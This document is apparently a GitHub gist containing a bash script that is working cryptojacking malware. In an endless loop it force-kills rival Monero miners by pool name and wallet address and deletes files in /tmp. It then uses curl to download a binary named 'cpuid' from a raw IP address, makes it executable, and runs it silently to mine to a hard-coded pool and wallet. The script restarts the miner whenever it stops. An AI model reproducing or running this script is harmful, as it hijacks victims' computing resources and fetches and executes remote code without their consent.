#date: 2022-01-07T17:08:43Z
#url: https://api.github.com/gists/83da4bdc5d036e6bb62db0ef6f6e8f13
#owner: https://api.github.com/users/c6rd6cycg

#!/bin/bash
while true
do
function kills() {
        rm -rf /tmp/*index_bak*
        rm -rf /tmp/*httpd.conf*
        rm -rf /tmp/*httpd.conf
        rm -rf /tmp/a7b104c270
        pkill -9 AnXqV.yam
        ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
　　　　ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQt989KEfGRt6Ww2Xg8"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
        ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
}


function downloadyam() {
        cd /tmp/
        if [ ! -f "cpuid" ];then
                curl http://185.106.120.200/_path_/_file_/cpuid > cpuid && chmod +x cpuid
                ./cpuid -o 51.222.149.40:443 -u 48FSwsrSKC1Lfko79XSnn2D88n2RT3aM7iW4eAFWDrTEHnJ93ELTHmVCPYC7bq8zB6CkUonUjL6SGY2SHrqiHoQEJcj15Kf -p d &>>/dev/null &
        else
               ./cpuid -o 51.222.149.40:443 -u 48FSwsrSKC1Lfko79XSnn2D88n2RT3aM7iW4eAFWDrTEHnJ93ELTHmVCPYC7bq8zB6CkUonUjL6SGY2SHrqiHoQEJcj15Kf -p d &>>/dev/null &
        fi
}


kills
p=$(ps aux | grep cpuid | grep -v grep | wc -l)
if [ ${p} -eq 1 ];then
        echo "officeing"
elif [ ${p} -eq 0 ];then
        downloadyam
else
        echo ""
fi 
       sleep 5
done